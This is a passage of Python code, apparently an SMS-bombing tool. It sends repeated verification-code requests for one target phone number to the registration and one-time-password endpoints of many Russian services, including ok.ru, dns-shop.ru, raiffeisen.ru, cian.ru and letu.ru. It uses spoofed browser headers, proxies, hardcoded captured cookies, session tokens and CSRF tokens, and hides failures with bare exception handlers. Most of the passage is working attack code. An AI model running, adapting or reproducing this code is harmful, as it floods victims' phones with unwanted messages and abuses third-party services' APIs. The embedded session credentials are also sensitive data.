                            'Host': 'www.gulliver.ru',
                            'Origin': 'https://www.gulliver.ru',
                            'Referer': 'https://www.gulliver.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin',
                            'User-Agent': user
                        }

                        payload = {
                            'phone': num2,
                            'token': token
                        }
                        requests.post('https://www.gulliver.ru/api/authorization/phone/code_request', json=payload,
                                      headers=header, proxies=proxies)
                    except:
                        pass
                    try:
                        header = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                            'content-length': '117',
                            'content-type': 'application/json',
                            'cookie': 'utid=uRELsmLB3tujl2MGLkExAg==; _ym_d=1656872669; _ym_uid=165687266981967969; _ga=GA1.2.2011736262.1656872670; _gid=GA1.2.1237278458.1657153831; _ym_isad=1; _gat_uteka=1; uteka_city_id=2; _ga=GA1.3.2011736262.1656872670; _gid=GA1.3.1237278458.1657153831',
                            'dnt': '1',
                            'origin': 'https://spb.uteka.ru',
                            'platform': 'Desktop',
                            'referer': 'https://spb.uteka.ru/',
                            'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': user,
                            'version': '694031d3'
                        }

                        payload = {"jsonrpc": "2.0", "id": '6', "method": "auth.GetCode",
                                   "params": {"phone": number[1:], "mustExist": False, "sendRealSms": True}}
                        requests.post('https://spb.uteka.ru/rpc/?method=auth.GetCode', json=payload, headers=header,
                                      proxies=proxies)
                    except:
                        pass

                        try:
                            header = {
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'cache-control': 'max-age=0',
                                'content-length': '25',
                                'content-type': 'application/x-www-form-urlencoded',
                                'cookie': 'JSESSIONID=a42d2ee7b58c347d1c614a1a013544a17651b0a68c29bd2f.9bedfb08; bci=1871035486256896851; _statid=5ea6268e-ddfb-4699-974c-d09fd19bb66a; landref=yandex.ru; viewport=1032; _ym_uid=1658092644731300424; _ym_d=1658092644; _ym_isad=1; mtrc=%7B%22mytrackerid%22%3A53328%7D',
                                'dnt': '1',
                                'origin': 'https://ok.ru',
                                'referer': 'https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'document',
                                'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'same-origin',
                                'sec-fetch-user': '?1',
                                'upgrade-insecure-requests': '1',
                                'user-agent': user
                            }
                            payload = {
                                'st.r.phone': '+' + number
                            }
                            requests.post(
                                'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
                                data=payload, headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'Accept': '*/*',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'Connection': 'keep-alive',
                                'Content-Length': '25',
                                'content-type': 'application/x-www-form-urlencoded',
                                'Cookie': 'city_path=moscow; current_path=9565a5103f36ecea17597b8bfe0de40efdc12ecd83502fc6a8abccb573ee963ba%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A116%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22default%22%7D%22%3B%7D; phonesIdent=5c5850539481e5dfaf6501ccec31923494b6f6327536f010c1851adae1c19e13a%3A2%3A%7Bi%3A0%3Bs%3A11%3A%22phonesIdent%22%3Bi%3A1%3Bs%3A36%3A%22cb04f377-3909-4313-9515-38e0f16f40b4%22%3B%7D; _ga=GA1.2.1077691371.1648506632; rrpvid=237990906799456; _ym_d=1648507072; _ym_uid=16485070724884085; lang=ru; cookieImagesUploadId=148f94fe5986ba5a926f6013164b4eff839438f61a613e7b64fd3fb4fbbe1a85a%3A2%3A%7Bi%3A0%3Bs%3A20%3A%22cookieImagesUploadId%22%3Bi%3A1%3Bs%3A36%3A%22107c0e7b-d098-4e04-baf6-ace2caa07378%22%3B%7D; _ab_=d296a4450e43512a5caac3c58811113651854db8805f13e4348e7c7d37971c94a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22_ab_%22%3Bi%3A1%3Ba%3A1%3A%7Bs%3A12%3A%22price-filter%22%3Bs%3A17%3A%22CATALOG_WITH_ADDS%22%3B%7D%7D; auth_public_uid=c49d16596017c745fa17f96e4225ac69; date-user-last-order-v2=8a0959c6170daf8712c77f5448afa3aba2062a69aefbbad68eb530f68cf8dba2a%3A2%3A%7Bi%3A0%3Bs%3A23%3A%22date-user-last-order-v2%22%3Bi%3A1%3Bi%3A-36000%3B%7D; cartUserCookieIdent_v3=d5d9f4f5c1775775b823f28723600896bb3163bf9f8d5fd469f4dbe08295229ca%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%2218f80cbc-6983-33b6-9ac3-7ce88bd22e85%22%3B%7D; _gid=GA1.2.709521899.1658202855; auth_access_token=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTgyNjA4NDMsInJuZCI6ImZkYmQ0YjRjMzY4MDVkMzZmM2NmMWE1Zjg5MWRmM2ZkMGJlODdkODc3M2FiODE2NTUzNzY3MDkwOTg4ZTg3ZjAiLCJ1c2VySWQiOiJkOWU1ZTkwNi0zMjQ3LWEyY2YtMTZiNi1jZGNkNWEyM2YxYTEiLCJ1c2VyTmFtZSI6IiJ9.MEQCIH20fowQn6tTc2782ZBvdYP307xgzsnvWoxv52PtjVH7AiABP_xLEvW6ovh14wFnvlE5KFPGkFnGcW4Dpz1u1gAM3g; auth_refresh_token=9ea2d3f8fbb2d351cbbf891aec94d36b3d2714d894aba28b3544043ce1a56645; auth_ssid=5322bf683a98fd52ae8a9771ac5af41d7c2c88503adc0d6c021ec03862a73423; PHPSESSID=46d748baf2fed7fd89e5686ba7addf32; notify_user=C1qq%2B7HrwC7Ky5dFmPPydsEaQ%2BYkXo0a02fvgrfrBA1HQnFVe3aw3ZKL7I08MQUWNTVRnIT1h0zoGUSQjrgPxw%3D%3D; notify_visitor=nE5LCKNnN5JIa2ioiyQCkMuQdW73i9YkAYpA%2B2kLCm3%2BlHqL%2FDVzMuaxN6VPxIpHarczABJL%2FWpDDyEwCQtrcw%3D%3D; profile__csrf=04f51f3cc5ce23f5812082550f43b5a1e7f2c1ce4fd3ea368ed06773163f3011a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22profile__csrf%22%3Bi%3A1%3Bs%3A32%3A%22gU0ciYIJddxthkWudlqCEDAaH0Py7pfw%22%3B%7D; profile_phonesIdent=1469ae96725566a0f87f4338f28de2947f7c42f093118209227239ec2c2c32aca%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22profile_phonesIdent%22%3Bi%3A1%3Bs%3A36%3A%2236d7b94e-8883-43f4-a3b7-3a0a66947e79%22%3B%7D; rerf=AAAAAGLXCug/TKthJqnAAg==; ipp_uid=1658260200212/PmOcH5BZ4a5Od2Q1/w2qFVmBf12TTWqdOpvWquw==; ipp_key=v1658260200212/v33947245ba5adc7a72e273/O+X65vdCghsCABj/W+q/Qw==',
                                'DNT': '1',
                                'Host': 'profile.dns-shop.ru',
                                'Origin': 'https://profile.dns-shop.ru',
                                'Referer': 'https://profile.dns-shop.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'Sec-Fetch-Dest': 'empty',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'same-origin',
                                'User-Agent': user,
                                'X-CSRF-Token': 'nfpJtVVrr7lBL2s-_nBakbZQki3iwMdMs24BufQ1YYj6r3nWPDLm8yVLE0qWGw3k0jzjbqeEhi37XlHAw0UH_w==',
                                'X-Requested-With': 'XMLHttpRequest'
                            }
                            payload = {
                                'phone': number,
                                'token': ''
                            }
                            requests.post('https://profile.dns-shop.ru/uniformProfile/personal/confirm-code-send/',
                                          data=payload, headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '0',
                                'cookie': 'old_design=0; _tuid=c6448b0a001e3090da7e86e5ae7b4bd2f27e523c; _space=spb_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; ab_test_analytics=90x10v4%3A1%7Creindexer%3A2%7Cnew_designv10%3A2%7Cnew_designv13%3A1%7Cproduct_card_design%3A3%7Cdynamic_yield%3A2%7Cwelcome_mechanics%3A4%7Cdummy%3A20; _dy_csc_ses=t; _dy_c_exps=; _pcl=eW5i1HY5TuPGBg==; is_show_welcome_mechanics=1; _dy_ses_load_seq=47503%3A1658091107276; _dy_c_att_exps=; _dy_soct=1017570.1030352.1658091107*1033770.1068198.1658091107*1036008.1075335.1658091107*1046273.1214460.1658091107*1008131.1012968.1658091107*1015299.1026208.1658091107',
                                'dnt': '1',
                                'origin': 'https://www.citilink.ru',
                                'referer': 'https://www.citilink.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            requests.post(f'https://www.citilink.ru/registration/confirm/phone/+{number}/',
                                          headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'Accept': 'application/json, text/javascript, */*; q=0.01',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'Connection': 'keep-alive',
                                'Content-Length': '24',
                                'Content-Type': 'application/json',
                                'Cookie': 'geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; mobile=false; device=pc; _ga=GA1.2.823290515.1656377291; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; _ym_uid=16563772911015405951; _ym_d=1656377291; __zzat129=MDA0dBA=Fz2+aQ==; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; cfids129=; APPLICATION_CONTEXT_CITY=21; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F102.0.5005.115%20Safari%2F537.36%20OPR%2F88.0.4412.75; _gid=GA1.2.229297435.1657385025; _ym_isad=1; _ym_visorc=b; geo_detect_coords=55.796539%2C49.1082; geo_detect_url=kazan; geo_detect=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C%2C%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%20%D0%A2%D0%B0%D1%82%D0%B0%D1%80%D1%81%D1%82%D0%B0%D0%BD%2C%D0%9F%D1%80%D0%B8%D0%B2%D0%BE%D0%BB%D0%B6%D1%81%D0%BA%D0%B8%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; _gat=1; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form',
                                'DNT': '1',
                                'Host': 'oapi.raiffeisen.ru',
                                'Origin': 'https://www.raiffeisen.ru',
                                'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'Sec-Fetch-Dest': 'empty',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'same-site',
                                'User-Agent': user
                            }
                            payload = {"number": number}
                            requests.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms',
                                          json=payload,
                                          headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '210',
                                'content-type': 'application/json',
                                'dnt': '1',
                                'origin': 'https://pizzahut.ru',
                                'referer': 'https://pizzahut.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-site',
                                'user-agent': user
                            }
                            payload = {"operationName": "sendSmsRegistration", "variables": {"phone": number},
                                       "query": "mutation sendSmsRegistration($phone: String!) {\n  sendSmsRegistration(phone: $phone) {\n    phone\n    __typename\n  }\n}\n"}
                            requests.post('https://ruhqphdevback01.pizzahut.ru/graphql', json=payload, headers=header,
                                          verify=False)
                        except:
                            pass
                        try:
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '50',
                                'content-type': 'application/json',
                                'cookie': 'cf_clearance=pUtn2Uhr8jZdtAgsnZpYoNMETwur_MgjVR5XAI_hxuk-1656377505-0-150; _CIAN_GK=21a640c3-5527-4144-9257-13f54f73cf06; session_region_id=1; adb=1; login_mro_popup=1; sopr_utm=%7B%22utm_source%22%3A+%22direct%22%2C+%22utm_medium%22%3A+%22None%22%7D; __cf_bm=EGOlfqwI74sY05RNNtRJ41UXSjo7iz_mwq26osjK_I4-1657385366-0-AX0+cpmNhrd8kjYCDL3fJfDcWsmaONkTlro/xo6fIgrm2MJUi3gHI/lrechBtSe6NH8qoD0QUFWTj1GCZ4iA+Nw=; sopr_session=dfbcc56b7faf4662',
                                'dnt': '1',
                                'origin': 'https://www.cian.ru',
                                'referer': 'https://www.cian.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-site',
                                'user-agent': user
                            }
                            payload = {
                                "phone": "+" + number,
                                "type": "authenticateCode"
                            }
                            requests.post('https://ud-api.cian.ru/sms/v2/send-validation-code/', json=payload,
                                          headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += "+"
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += ' '
                            num2 += '-'
                            num2 += ' '
                            num2 += num[7]
                            num2 += num[8]
                            num2 += ' '
                            num2 += '-'
                            num2 += ' '
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'accept': 'application/json, text/javascript, */*; q=0.01',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '219',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'cookie': 'city=%D0%A3%D1%84%D0%B0; city_auto=%D0%A3%D1%84%D0%B0; PHPSESSID=4MjylRdnF2wecKdI9mZ644mmZBQPsJTr; BITRIX_SM_GUEST_ID=1119274; BITRIX_SM_LAST_ADV=7_Y; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A10%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153957133624831; _ym_d=1657153957; _ym_isad=1; _ym_visorc=w; city_checked=true; BITRIX_SM_LAST_VISIT=07.07.2022+03%3A36%3A40',
                                'dnt': '1',
                                'origin': 'https://madyart.ru',
                                'referer': 'https://madyart.ru/reg/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-requested-with': 'XMLHttpRequest'
                            }
                            payload = {
                                'wct_reg_fio': 'Пупкин',
                                'wct_reg_fio2': 'Вася',
                                'wct_reg_phone': num2,
                                'wct_reg_ch': 'Y',
                                'wct_reg_1': '',
                                'wct_reg_2': '',
                                'wct_reg_3': '1',
                                'wc_phone_psw': 'Google123',
                                'wc_phone_psw2': 'Google123'
                            }
                            requests.post('https://madyart.ru/local/aut.php', data=payload, headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += "+"
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += '-'
                            num2 += num[7]
                            num2 += num[8]
                            num2 += '-'
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'accept': 'application/json',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '49',
                                'content-type': 'application/json',
                                'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; language=ru-RU; ssaid=81e148c0-bf40-11ec-b2af-fd9071e6be4e; _ga=GA1.2.1488420238.1656547396; _ym_d=1656547396; _ym_uid=1650304436300168392; iap.uid=05edc3da24e744d985197bcea804f655; __tld__=null; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1NTQwNDIzMjMwMCIsImF1dGhvcml0aWVzIjoiUk9MRV9BTk9OWU1PVVMiLCJzaXRlSWQiOiJzdG9yZU1vYmlsZVJVIiwiaWF0IjoxNjU4NTAxNzExLCJleHAiOjE2NTg1ODgxMTF9.a3F7xVn1e7sXsou9oQ8O3cd3INVQXsbuRlyPa_GGD9pTWI4ZbxnlxStGmVHTmcPiSIt5SKxrmmPkDyGJtd17bg; JSESSIONID=kI5ZODsJZyfPn_6uQhvrdkZSrJI_.letu-wru-05; cityDetected=true; letu.marker.src_id="srcid=sem_yandex&srcid2=search_brand"; _gcl_au=1.1.1465884998.1658501717; _gid=GA1.2.970117108.1658501718; tmr_lvid=1d0c4c6c6f887593714d715b82fd201f; tmr_lvidTS=1658501717833; _ym_isad=1; tmr_detect=1%7C1658501717840; _gat_ddm=1; mindboxDeviceUUID=4b99ae4c-f1c8-42a9-aae4-135bc4e69485; directCrm-session=%7B%22deviceGuid%22%3A%224b99ae4c-f1c8-42a9-aae4-135bc4e69485%22%7D; flocktory-uuid=98d1d2ec-f2a2-43e2-b94b-d51ec4f9c13d-8; cityGuessed=true; tmr_reqNum=10',
                                'dnt': '1',
                                'origin': 'https://www.letu.ru',
                                'referer': 'https://www.letu.ru/promo/11550043?srcid=sem_yandex&srcid2=search_brand&utm_medium=cpc&utm_source=yandex_letu&utm_campaign=Brend_Poisk_ves_mir_Action%7C75965483&utm_term=%D0%BB%D1%8D%D1%82%D1%83%D0%B0%D0%BB%D1%8C&utm_content=k50id%7C0100000039735914258_%7Ccid%7C75965483%7Cgid%7C4960197635%7Caid%7C12375976536%7Cadp%7Cno%7Cpos%7Cpremium1%7Csrc%7Csearch_none%7Cdvc%7Cdesktop%7Cmain&k50id=0100000039735914258_&etext=2202.BHsOtI0seJdSpXloeWcyDaQOLi9VvEZVattxWWHjgjF5cXZmd2l1aXpsaHBqbXNy.1b56ea5996af7589b1ec0b6e967d612b66d7e900&_openstat=ZGlyZWN0LnlhbmRleC5ydTs3NTk2NTQ4MzsxMjM3NTk3NjUzNjt5YW5kZXgucnU6cHJlbWl1bQ&yclid=4158890799608943602',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user,
                                'x-instana-l': '1,correlationType=web;correlationId=dfaa6202796e3904',
                                'x-instana-s': 'dfaa6202796e3904',
                                'x-instana-t': 'dfaa6202796e3904',
                                'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
                            }
                            payload = {
                                "phoneNumber": num2,
                                "captcha": ""
                            }
                            requests.post(
                                'https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU',
                                json=payload, headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += "+"
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += '-'
                            num2 += num[7]
                            num2 += num[8]
                            num2 += '-'
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'bx-ajax': 'true',
                                'content-length': '100',
                                'content-type': 'application/x-www-form-urlencoded',
                                'cookie': 'BITRIX_SM_LOCATION_SHOW_FIRST=Y; BITRIX_SM_SALE_UID=14278587; BITRIX_SM_EVRAZ_CURRENT_LOC_ID=93; BITRIX_SM_EVRAZ_LAST_IP_V2=178.170.198.53; operator=0; authorization=0; BITRIX_SM_EVRAZ_LOC_ID=93; BITRIX_SM_EVRAZ_CITY=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; PHPSESSID=dht920OeuwO0zg0WpS7XtRnQidNljqgm',
                                'dnt': '1',
                                'origin': 'https://spb.evraz.market',
                                'referer': 'https://spb.evraz.market/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'sec-fetch-dest': 'empty',
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'user-agent': user
                            }
                            payload = {
                                'userPhone': num2,
                                'captchaCode': '',
                                'captchaWord': '',
                                'sessid': 'ac6ac34893c17c4e741846e83cf0104e'
                            }
                            requests.post(
                                'https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms',
                                data=payload, headers=header)
                        except:
                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += '+'
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += ' '
                            num2 += num[7]
                            num2 += num[8]
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'Accept': '*/*',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'Connection': 'keep-alive',
                                'Content-Length': '398',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'DNT': '1',
                                'Host': 'accounts.eu1.gigya.com',
                                'Origin': 'https://cdns.eu1.gigya.com',
                                'Referer': 'https://cdns.eu1.gigya.com/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'Sec-Fetch-Dest': 'empty',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'same-site',
                                'User-Agent': user
                            }
                            payload = {
                                'phoneNumber': num2,
                                'lang': 'ru',
                                'APIKey': '4_eXEZkSmgY277qYb5XXqALQ',
                                'source': 'showScreenSet',
                                'sdk': 'js_latest',
                                'authMode': 'cookie',
                                'pageURL': 'https://mega.ru/',
                                'gmid': 'gmid.ver4.AcbHeQOgVA.WnFLjnxHAZJlHXbPSBOGwOT94PmaAMXnuAG3_n0y7-4fkOIJqlokay-B8TDupP2M.WaSZ_ByPi8_llIxjwUT67KZevbkijR1_LMyA48WsFNWy7VOGI5Eob2wMLj1Crh9Wy6-J1YMWGPf3NMUOXUBBpg.sc3',
                                'ucid': 'NGvv00DdQGL_7np4-w6tpA',
                                'sdkBuild': '13232',
                                'format': 'json',
                            }
                            requests.post('https://accounts.eu1.gigya.com/accounts.otp.sendCode', data=payload,
                                          headers=header)
                        except:
                            pass
                        try:
                            header = {
                                'accept': '*/*',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'content-length': '948',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
